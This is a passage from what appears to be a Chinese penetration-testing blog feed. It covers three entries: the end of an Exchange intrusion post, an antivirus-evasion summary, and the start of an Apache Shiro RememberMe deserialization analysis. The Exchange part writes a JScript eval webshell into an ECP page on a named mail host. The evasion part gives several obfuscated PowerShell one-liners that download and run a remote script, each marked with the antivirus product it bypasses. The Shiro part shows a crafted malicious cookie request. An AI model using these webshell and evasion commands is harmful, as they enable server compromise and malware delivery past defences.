class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;SlabHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.slab&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.SlabHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;ImportContactList&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*/ImportContactList.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;Ashxhandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.ashx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.SimpleHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;UploadPolicyFromISV&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*/ManagePolicyFromISV.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;EmailTemplatesHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;OsiTemplateForAlertUpdateEmail*.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;OsiAttachmentsHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*AttachmentOperations.ashx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET,POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.SimpleHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exec cmd.exe &#x2F;c echo %ExchangeInstallPath%</span><br><span class="line"></span><br><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ExpiredPassword.aspx</span><br><span class="line">https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa&#x2F;auth&#x2F;ExpiredPassword.aspx</span><br><span class="line"></span><br><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\LiveIdError.aspx</span><br><span class="line">https:&#x2F;&#x2F;mail.tfzq.com&#x2F;ecp&#x2F;LiveIdError.aspx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec cmd &#x2F;c echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;qax&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\Progra~1\Microsoft\Exchan~1\V15\ClientAccess\ecp\OrgIdError.aspx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀总结</title>
      <link href="2021/06/14/%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/"/>
      <url>2021/06/14/%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀总结"><a href="#免杀总结" class="headerlink" title="免杀总结"></a>免杀总结</h1><p>学习总结免杀技巧</p><hr><h2 id="1、杀毒原理"><a href="#1、杀毒原理" class="headerlink" title="1、杀毒原理"></a>1、杀毒原理</h2><p>360、腾讯电脑管家、火绒剑、金山毒霸、瑞星等等，这几个杀毒软件领头羊，现在的杀毒软件都无法脱离三个部分，<strong>扫描器</strong>、<strong>病毒库</strong>、<strong>虚拟机</strong>。然而一个杀毒软件做的是否好用，最主要的还是扫描器的速度、准确率以及病毒库是否庞大。</p><h3 id="1-1、基于特征码的静态扫描技术"><a href="#1-1、基于特征码的静态扫描技术" class="headerlink" title="1.1、基于特征码的静态扫描技术"></a>1.1、基于特征码的静态扫描技术</h3><p>这种技术很容易被人想到，所以第一代的杀毒软件出现了，他们的杀毒思想就是，我只要匹配到特征字符串就可以判断出来这个文件是一个病毒。但这种方法在当今病毒技术迅猛发展的形势下已经起不到很好的作用了。</p><h3 id="1-2、启发式扫描"><a href="#1-2、启发式扫描" class="headerlink" title="1.2、启发式扫描"></a>1.2、启发式扫描</h3><p>为了对付病毒的不断变化和对未知病毒的研究，启发式扫描方式出现了。启发式扫描是通过分析指令出现的顺序，或特定组合情况等常见病毒的标准特征来判断文件是否感染未知病毒。</p><p>可以根据扫描特定的行为或多种行为的组合来判断一个程序是否是病毒。例如，制定一套打分机制，在系统目录下释放文件得20分，对分区进行格式化得100分，对启动项进行操作得50分等，只要评分达到某个预设值，即可判断为病毒文件。</p><h3 id="1-3、虚拟机技术"><a href="#1-3、虚拟机技术" class="headerlink" title="1.3、虚拟机技术"></a>1.3、虚拟机技术</h3><p>查毒引擎中的虚拟机，并不是像 <code>VMWare</code> 的工作原理那样，为待查的可执行程序创建一个虚拟的执行环境，提供它可能用到的一切元素，包括硬盘，端口等，让它在其上自由发挥，最后根据其行为来判定是否为病毒。</p><p>设计虚拟机查毒的目的，就是为了对付加密变形病毒，虚拟机首先从文件中确定并读取病毒入口处代码，然后以上述工作步骤解释执行病毒头部的解密段（Decryptor），最后在执行完的结果（解密后的病毒体明文）中查找病毒的特征码。</p><hr><h2 id="2、免杀技术"><a href="#2、免杀技术" class="headerlink" title="2、免杀技术"></a>2、免杀技术</h2><h3 id="2-1、修改特征码"><a href="#2-1、修改特征码" class="headerlink" title="2.1、修改特征码"></a>2.1、修改特征码</h3><p>既然杀毒软件在最开始时，使用了病毒特征码概念，那么我们可以通过修改病毒特征码的方式躲过杀软扫描。</p><p>第一种是更改特征码，例如：一个文件在某一个地址内有 “灰鸽子上线成功” 这么一句话，表明它就是木马，只要将相应地址内的那句话改成别的就可以了。</p><p>第二种是根据校验和查杀技术提出的免杀思想，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。</p><h3 id="2-2-、花指令免杀"><a href="#2-2-、花指令免杀" class="headerlink" title="2.2 、花指令免杀"></a>2.2 、花指令免杀</h3><p>花指令免杀是指，在程序 <code>shellcode</code> 或特征代码区域增添垃圾指令，这些指令没有实际含义，不会改变程序运行逻辑，但可以阻止反编译，现在杀软在检测特征码时，都会存在偏移范围，当我们使用花指令对特征码区域进行大量填充，这样就可以实现躲避杀软的特性。</p><h3 id="2-3、加壳免杀"><a href="#2-3、加壳免杀" class="headerlink" title="2.3、加壳免杀"></a>2.3、加壳免杀</h3><p>加壳，程序加壳可以很好的躲避匹配特征码查杀方式，加密壳基本上可以把特征码全部掩盖。这里说的壳指加密壳，一些普通压缩壳，并不能起到改变特征码的效果，例如： <code>UPX</code> 、 <code>ASPack</code> 等。</p><p>现在杀软会在检测到文件采用加密壳之后，直接提醒用户，该文件存在问题。可以使用不常见加密壳对程序进行加壳，来躲避杀软，该方法理论可用，只通过加壳实现免杀，成功几率很小，现在基于虚拟机技术，内存监测技术的发展，通过加壳方式进行免杀的思路越来越窄。</p><h3 id="2-4、-二次编译"><a href="#2-4、-二次编译" class="headerlink" title="2.4、 二次编译"></a>2.4、 二次编译</h3><p><code>msfvenom</code> 提供了多种格式的 <code>payload</code> 和 <code>encoder</code> ，生成的 <code>shellcode</code> 也为二次加工提供了很大便利，但是也被各大厂商盯得死死的。</p><p>而 <code>shikata_ga_nai</code> 是 <code>msf</code> 中唯一的评价是 <code>excellent</code> 的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。</p><p>目前 <code>msfvenom</code> 的 <code>encoder</code> 特征基本都进入了杀软的漏洞库。互联网上有很多借助于 <code>C、C#、python</code> 等语言对 <code>shellcode</code> 进行二次编码从而达到免杀的效果。</p><h3 id="2-5、Powershell-免杀"><a href="#2-5、Powershell-免杀" class="headerlink" title="2.5、Powershell 免杀"></a>2.5、Powershell 免杀</h3><p><code>Windows PowerShell</code>是一个命令行管理程序，相比较于<code>CMD</code>命令行，它更为强大，同时，它又是一种脚本语言，为系统管理设计。在<code>.NET Framework</code>的基础上构建，简单来说，可以类比<code>UNIX</code>系统的脚本(shell)。</p><p>2002年，微软研究了一个新的产品<code>Monad</code>，在2005年发布第一个版本，到2006年被重命名为<code>Windows PowerShell</code>，目前微软官网文档，已经更新到7.2版本，第一款默认集成<code>PowerShell</code>的系统版本是<code>Windows Server 2008</code>。</p><h4 id="2-5-1、拆分DownloadString函数"><a href="#2-5-1、拆分DownloadString函数" class="headerlink" title="2.5.1、拆分DownloadString函数"></a>2.5.1、拆分DownloadString函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 拆分DownloadString函数 + echo 过最新版火绒 + 360 12.X版本</span><br><span class="line">cmd &#x2F;c echo $c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;XX.XX.XX.XX&#x2F;test.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2) | powershell -</span><br></pre></td></tr></table></figure><h4 id="2-5-2、拆分http关键字"><a href="#2-5-2、拆分http关键字" class="headerlink" title="2.5.2、拆分http关键字"></a>2.5.2、拆分http关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 拆分http关键字，过360 12.X版本</span><br><span class="line">powershell &quot;$a&#x3D;&#39;IEX((New-Object Net.WebClient).DownloadString(&#39;&#39;ht&#39;;$b&#x3D;&#39;tp:&#x2F;&#x2F;XX.XX.XX.XX&#x2F;test.ps1&#39;&#39;))&#39;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure><h4 id="2-5-3、中文引号"><a href="#2-5-3、中文引号" class="headerlink" title="2.5.3、中文引号"></a>2.5.3、中文引号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#通过中文引号，绕过360 12.X版本</span><br><span class="line">powershell &quot;IEX ((new-object net.webclient).downloadstring(&#39;ht‘+’tp:&#x2F;&#x2F;XX.XX.XX.XX&#x2F;test.ps1&#39;))&quot;</span><br></pre></td></tr></table></figure><h4 id="2-5-4、替换IEX-http拆分"><a href="#2-5-4、替换IEX-http拆分" class="headerlink" title="2.5.4、替换IEX + http拆分"></a>2.5.4、替换IEX + http拆分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 替换IEX + http拆分 绕过最新版火绒</span><br><span class="line">powershell &quot;$a&#x3D;&#39;123((New-Object Net.WebClient).DownloadString(&#39;&#39;ht&#39;.Replace(&#39;123&#39;,&#39;IEX&#39;);$b&#x3D;&#39;tp:&#x2F;&#x2F;XX.XX.XX.XX&#x2F;test.ps1&#39;&#39;))&#39;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/762ab8750841">https://www.jianshu.com/p/762ab8750841</a><br><a href="https://www.freebuf.com/articles/web/274196.html">https://www.freebuf.com/articles/web/274196.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro RememberMe 反序列化漏洞分析</title>
      <link href="2021/05/03/Apache-Shiro-RememberMe-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2021/05/03/Apache-Shiro-RememberMe-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Shiro-RememberMe-反序列化漏洞分析"><a href="#Apache-Shiro-RememberMe-反序列化漏洞分析" class="headerlink" title="Apache Shiro RememberMe 反序列化漏洞分析"></a>Apache Shiro RememberMe 反序列化漏洞分析</h1><hr><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Apache Shiro 是ASF旗下的一款开源软件，它提供了一个强大而灵活的安全框架，提供身份验证、授权、密码学和会话管理。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中，攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令</p><hr><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>issues：<a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a><br>在shiro &lt;= 1.2.4版本中，如果用户选择了Remember Me，那么shiro就会进行如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取Remember Me cookie值</span><br><span class="line">Base64解码</span><br><span class="line">AES解码</span><br><span class="line">反序列化</span><br></pre></td></tr></table></figure><p>而我们知道Remember cookie的生成方式是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">序列化</span><br><span class="line">AES加密</span><br><span class="line">Base64加密</span><br><span class="line">生成Remember Me cookie值</span><br></pre></td></tr></table></figure><p>由于AES加解密的秘钥被硬编码在代码中，这意味着有权访问源代码的任何人都知道默认加密密钥是什么，因此，攻击者可以创建一个恶意对象并对其进行序列化，编码，然后将其作为cookie发送，然后Shiro将解码并反序列化，从而导致恶意代码执行</p><hr><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache Shiro &lt;=1.2.4(由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h3><ul><li>IDEA</li><li>shiro 1.2.4</li><li>Tomcat 8.5.64</li><li>Jdk 1.8/15</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Shiro 1.2.4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;shiro-root-1.2.4.zip</span><br><span class="line">或者：</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.git  </span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210503162945842.png" alt="image-20210503162945842"></p><p>修改/shiro/samples/web路径下的pom.xml，其实就是加一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;version&gt;1.2&lt;&#x2F;version&gt;</span><br></pre></td></tr></table></figure><p>具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;&#x2F;version&gt; </span><br><span class="line">            &lt;scope&gt;runtime&lt;&#x2F;scope&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><p>然后导入IDEA：</p><p><img src="/images/image-20210503163938337.png" alt="image-20210503163938337"></p><p>导入成功后idea会自动去下载所需的依赖</p><p>接下来配置Tomcat，下载<a href="https://tomcat.apache.org/download-80.cgi">Tomcat</a></p><p><img src="/images/image-20210503164634775.png" alt="image-20210503164634775"></p><p>接着idea配置tomcat，点击编辑配置</p><p><img src="/images/image-20210503164812932.png" alt="image-20210503164812932"></p><p><img src="/images/image-20210503164920132.png" alt="image-20210503164920132"></p><p>配置一下Artifact</p><p><img src="/images/image-20210503165106103.png" alt="image-20210503165106103"></p><p>运行</p><p><img src="/images/image-20210503165225979.png" alt="image-20210503165225979"></p><p><img src="/images/image-20210503165347202.png" alt="image-20210503165347202"></p><p>环境搭建完成</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="定位漏洞文件"><a href="#定位漏洞文件" class="headerlink" title="定位漏洞文件"></a>定位漏洞文件</h4><p>idea双击shift，进行搜索（如果搜索不到相应的类，可以参考 <a href="https://www.it610.com/article/1289028215058276352.htm">https://www.it610.com/article/1289028215058276352.htm</a> )跟踪RememberMeManager</p><p><img src="/images/image-20210503173428234.png" alt="image-20210503173428234"></p><p>右上角有个下载源文件，点击即可反编译出.java源代码，但是并没有发现该类中有硬编码的加密密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shiro\shiro-web\1.2.4\shiro-web-1.2.4-sources.jar!\org\apache\shiro\web\mgt\CookieRememberMeManager.java</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210503173810179.png" alt="image-20210503173810179"></p><p>跟踪他的父类AbstractRememberMeManager</p><p>发现经过base64硬编码的秘钥，因为 AES 是对称加密，即加密密钥也同样是解密密钥：</p><p><img src="/images/image-20210503174318985.png" alt="image-20210503174318985"></p><p>跟踪查看<code>AbstractRememberMeManager</code>类需要实现RememberMeManager接口有哪些：即登陆认证（成功、失败）、退出登录</p><p><img src="/images/image-20210503174556830.png" alt="image-20210503174556830"></p><h4 id="加密cookie流程分析"><a href="#加密cookie流程分析" class="headerlink" title="加密cookie流程分析"></a>加密cookie流程分析</h4><p>检索cookie中<code>RememberMe</code>的值、Base64解码、使用AES解密 、反序列化操作，所以不妨直接在<code>AbstractRememberMeManager</code>的<code>onSuccessfulLogin</code>处下断点，之后使用初始化的用户模拟未经身份验证的用户进行登录操作，先来跟踪一下<code>RememberMe</code>的生成流程：</p><p><img src="/images/image-20210503193532710.png" alt="image-20210503193532710"></p><p>点击debug调试</p><p><img src="/images/image-20210503193749661.png" alt="image-20210503193749661"></p><p>点击页面的Log in进入登录认证页面，使用系统用户root/secret进行登录，并勾选”Remember Me”(这一点非常非常重要），之后点击”Login”进行登录：</p><p><img src="/images/image-20210503194042050.png" alt="image-20210503194042050"></p><p>点击登录来到断点的地方</p><p><img src="/images/image-20210503194231340.png" alt="image-20210503194231340"></p><p>此处的<code>forgetIdentity</code>主要用来初始化构造一些请求和响应的字段：</p><p><img src="/images/image-20210503194325091.png" alt="image-20210503194325091"></p><p><img src="/images/image-20210503195210440.png" alt="image-20210503195210440"></p><p><img src="/images/image-20210503195407217.png" alt="image-20210503195407217"></p><p><img src="/images/image-20210503200148418.png" alt="image-20210503200148418"></p><p>debug下一步</p><p><img src="/images/image-20210503194429915.png" alt="image-20210503194429915"></p><p>之后判断<code>this.isRememberMe(token）</code>是否为空，由于我们在登陆认证时勾选了<code>rememberme</code>的选项框所以这里不为空，会继续走到<code>rememberIdentity</code>函数中，而该函数重要用于生成cookie中的remember的值，也是该漏洞的关键点，我们继续跟进：</p><p><img src="/images/image-20210503200400638.png" alt="image-20210503200400638"></p><p>之后继续跟进该函数，可以看到<code>rememberIdentity</code>函数首先会调用<code>getIdentityToRemember</code>函数来获取用户身份，也就是”root”：</p><p><img src="/images/image-20210503200817317.png" alt="image-20210503200817317"></p><p>接着我们跟进<code>rememberIdentity</code>构造方法，从函数命名上来看这里会将用户的身份也就是”root”转换成字节，我们下面跟进看看：</p><p><img src="/images/image-20210503201525362.png" alt="image-20210503201525362"></p><p>跟进<code>convertPrincipalsToBytes</code>方法</p><p><img src="/images/image-20210503202005347.png" alt="image-20210503202005347"></p><p>这里将<code>principals</code>对象进行了序列化，跟进该序列化操作，可以看到序列化的类为<code>PrincipalCollection</code>:</p><p><img src="/images/image-20210503202809092.png" alt="image-20210503202809092"></p><p>最终在<code>DefaultSerializer</code>类中的serialize方法中完成序列化操作</p><p><img src="/images/image-20210503203002171.png" alt="image-20210503203002171"></p><p>然后使用<code>encrypt</code>方法加密，也就是AES加密，这里跟进一下<code>encrypt</code></p><p><img src="/images/image-20210503203129103.png" alt="image-20210503203129103"></p><p><code>encrypt</code>函数中通过<code>getCipherService</code>来获取当前的加密方式，之后使用<code>GetEncryptionCipherKey</code>来获取加密秘钥，可以看到这里使用的加密方式为AES/CBC/PKCS5Padding，之后通过cipherService.encrypt来实现对root的加密：</p><p><img src="/images/image-20210503203623175.png" alt="image-20210503203623175"></p><p>跟进<code>getEncryptionCipherKey</code>函数发现，发现<code>encryptionCipherKey</code>为常量值：</p><p><img src="/images/image-20210503204212753.png" alt="image-20210503204212753"></p><p>而在该类的构造函数中会调用<code>this.setCipherKey对encryptionCipherKey</code>进行初始化赋值操作，而初始化参数为<code>DEFAULT_CIPHER_KEY_BYTES</code>，所以这里AES的加密解密秘钥由<code>DEFAULT_CIPHER_KEY_BYTES</code>指定：</p><p><img src="/images/image-20210503204525896.png" alt="image-20210503204525896"></p><p>接着继续跟进<code>encrypt</code>方法</p><p><img src="/images/image-20210503210028568.png" alt="image-20210503210028568"></p><p>这里的iv值由<code>generateInitializationVector</code>方法得到，返回一个类型为Bytes，长度为16的数组</p><p>接着调用<code>encrypt</code>的重载方法</p><p><img src="/images/image-20210503210405781.png" alt="image-20210503210405781"></p><p>这里使用了crypt方法对plaintext进行了加密，得到<code>encrypted</code></p><p>接着新建了一个byte型的数组，长度为iv的长度加上<code>encrypted</code>的长度</p><p>然后调用<code>arraycopy</code>方法得到了新的密文output</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.lang.System.arraycopy(Object src, int srcPos, Object dest, int destPos, int length)</span><br><span class="line">概念 : 将源数组中从指定位置开始的数据复制到目标数组的指定位置 .</span><br><span class="line">src : 源数组</span><br><span class="line">srcPos : 源数组要复制的起始位置</span><br><span class="line">dest : 目的数组</span><br><span class="line">destPos : 目的数组放置的起始位置</span><br><span class="line">length : 复制的长度</span><br></pre></td></tr></table></figure><p>回到<code>rememberIdentity</code>，跟进<code>rememberSerializedIdentity</code>方法</p><p><img src="/images/image-20210503210850057.png" alt="image-20210503210850057"></p><p><img src="/images/image-20210503211226150.png" alt="image-20210503211226150"></p><p>这里就将AES加密后的bytes进行了base64加密，最后通过response返回设置为用户的Cookie的rememberMe字段中</p><p>之后调用saveTo方法保存cookie</p><p><img src="/images/image-20210503211500138.png" alt="image-20210503211500138"></p><p>至此，正向的Cookie的生成方式分析完毕，下面反向跟踪分析Cookie中Remember的解析过程，也是最终触发反序列化的过程</p><h4 id="解密cookie流程分析"><a href="#解密cookie流程分析" class="headerlink" title="解密cookie流程分析"></a>解密cookie流程分析</h4><p>使用burpsuite构造以下请求并在<code>shiro\shiro-core\1.2.4\shiro-core-1.2.4.jar!\org\apache\shiro\mgt\AbstractRememberMeManager.class的getRememberedIdentity</code>处下断点进行调试，之后跟进<code>getRememberedPrincipals</code>：</p><p><img src="/images/image-20210503215017694.png" alt="image-20210503215017694"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;samples_web_war&#x2F;login.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 56</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;samples_web_war&#x2F;login.jsp</span><br><span class="line">Cookie: rememberMe&#x3D;evVNn+XiQ32SHXoZXDorRSJawLhNPaNJWEybhswbk1vekCvVYaqLx&#x2F;5B6wH&#x2F;PNC9NEeTG04wQb7yu1MegYMk2JF5E&#x2F;OAf0w2+hTqv6umL3vzpBHjIosLEQHeYYQS0iyd&#x2F;hpOYF3TgRsUnw7MihkUdmQUqPK1cxOj50Bc0Nfvab+mPQNZq3p9l+PYIFdd6+CF2Ug7wdayeuNM&#x2F;ON6E5sUlq6KRSP3saqP9spbP8DbAdVJOhPM39PubSMuSnEm0BstI+ituMZt1HklbEghssEX0g4nvNkvQ2WrbMonBOS+OXBHYUuSdY8PYJdP4j11RGHA6GQoRnWeQm4dgv&#x2F;xv6PmiQZuyke8EGy2Rze4awfx&#x2F;p4lOUhfNvSD39lLmL69djgmRCsx876J74hF4YLyNATGav&#x2F;yL1iOe3lLDOPne3abw&#x2F;uDrFpSux+8VWAWMH3G4hVMMfMbH+fG+yU5U5pIr8aIYD1yox6rQkYLovZbLG4sBboewPq0rq7kkAERcxWQfJt3np9k3&#x2F;AuytlnWMHoUGjvCvgHn7Sq2KuV1pcZqa&#x2F;mazF3prLdWaiVt9U4y30mxVyruuEtBrCEwN3HuX8vx5Qhj7JFA2Z2p9vv2CB+QRxZyrwoNSRNhMhoj+v4CHktB+3J5YtgYieo0pfivWxE8FXqXoDRWt&#x2F;mDBtxycKBW5nGCt1CR2T5+2JaqdEeD+w4tmFRtAsWSTkpb+oifysHCLrOArWj0Kb9GEXgLDFGol37jVuWrxLFKeDPkNJGsnT6cDLVir9oojEq3BvdYOusb6GsZxX&#x2F;FwgGgtihkpK3siScokEl2gcGw8Nl651dpe34PXFOtvgKbQM2lCg3zLX4YY4xF0NMcNrVlXXWk7v9PFtQrv6izC99lZcX7yhlO4vT&#x2F;GnDfuD+NLCPS9eY&#x2F;F0Ji+cE+guS29zWCAf52z6jRa